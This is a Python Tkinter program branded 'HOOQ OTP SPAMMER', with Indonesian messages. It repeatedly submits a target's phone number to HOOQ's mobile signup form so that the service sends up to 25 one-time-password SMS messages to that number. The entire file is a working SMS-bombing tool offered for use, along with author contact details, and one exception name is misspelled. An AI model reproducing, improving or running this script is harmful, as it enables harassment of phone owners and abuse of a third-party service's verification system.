from tkinter import *
from tkinter import messagebox
import mechanize,time

br = mechanize.Browser()
br.set_handle_equiv(True)
br.set_handle_gzip(True)
br.set_handle_redirect(True)
br.set_handle_referer(True)
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
br.addheaders = [("User-Agent","Mozilla/5.0 (Linux; U; Android 8.1)")]

root = Tk()
root.title("HOOQ SPAMMER [GUI]")
root.geometry('500x500')
root.configure(bg='black')
fram=Frame(root)

bn = Label(root, text="[ HOOQ OTP SPAMMER ]\n[ GUI VERSION ]\n",font=("Arial",10),fg="blue",bg='black')
bn.config(font=('High Tower Text', 14))
bn.pack()

lbl = Label(root,text="No target:",fg="yellow",bg="black")
lbl.pack()
no = Entry(root,width=20,bd=3)
no.pack()
lbl2 = Label(root, text="Jumlah:",fg="yellow",bg="black")
lbl2.pack()
jlm = Entry(root,width=10,bd=3)
jlm.pack()
Sid = Scrollbar(fram, width=12)
Tex = Text(fram, height=12, width=55, fg='white', bg='black')
Sid.pack(side=RIGHT, fill=Y)
Tex.pack(side=BOTTOM, fill=BOTH, expand=1)
Sid.config(command=Tex.yview)
Tex.config(yscrollcommand=Sid.set)

messagebox.showinfo('HOOQ OTP SPAMMER','Author: KANG-NEWBIE\nContact: https://t.me/kang_nuubi\nGithub: https://github.com/kang-newbie\nTeam: CRABS_ID')

def clicked():
	try:
		for i in range(int(jlm.get())):
			if int(jlm.get()) > 25:
				messagebox.showwarning('Kebanyakan bosque', 'Jangan kebanyakan ntar coid -_-')
				break
			br.open('https://authenticate.hooq.tv/signupmobile?returnUrl=https://m.hooq.tv%2Fauth%2Fverify%2Fev%2F%257Cdiscover&serialNo=c3125cc0-f09d-4c7f-b7aa-6850fabd3f4e&deviceType=webClient&modelNo=webclient-aurora&deviceName=webclient-aurora/production-4.2.0&deviceSignature=02b480a474b7b2c2524d45047307e013e8b8bc0af115ff5c3294f787824998e7')
			br.select_form(nr=0)
			br.form["mobile"] = str(int(no.get()))
#			br.form["password"] = "VersiGUIlebihgudea"
			res=br.submit().read()
			if 'confirmotp' in str(res):
				stat=f"[{str(i+1)}] sukses mengirim OTP ke {no.get()}\n"
			else:
				stat=f"[{str(i+1)}] gagal mengirim OTP ke {no.get()}\n"
			time.sleep(1)
			Tex.insert(END, stat)
	except ValueErrora:
		messagebox.showerror('Value Error','Input angka!!! -_-')
	except:
		messagebox.showerror('Connection Error','Sepertinya ada yang salah. coba:\nPriksa koneksi internet anda atau\nLaporkan ke author')
	
def keluar():
	res=messagebox.askyesno("Exit","Kamu yakin mau ninggalin aku?'-'",default='no')
	if res == True:
		print("Terima Kasih telah menggunakan tools saya\n-Kang_Newbie-")
		exit()
	
fram2=Frame(root)
blk= Label(root, text="",bg='black')
btn = Button(fram2, text="   SEND   ",bg="blue",fg="white",command=clicked)
btn2 = Button(fram2, text="    EXIT    ",bg="red",fg="white",command=keluar)
blk.pack()
btn.pack(side=RIGHT)
btn2.pack(side=LEFT)
fram2.pack()
stus=Label(root,text="\nRESULT :",fg='white',bg='black')
stus.pack()
fram.pack()
root.mainloop()
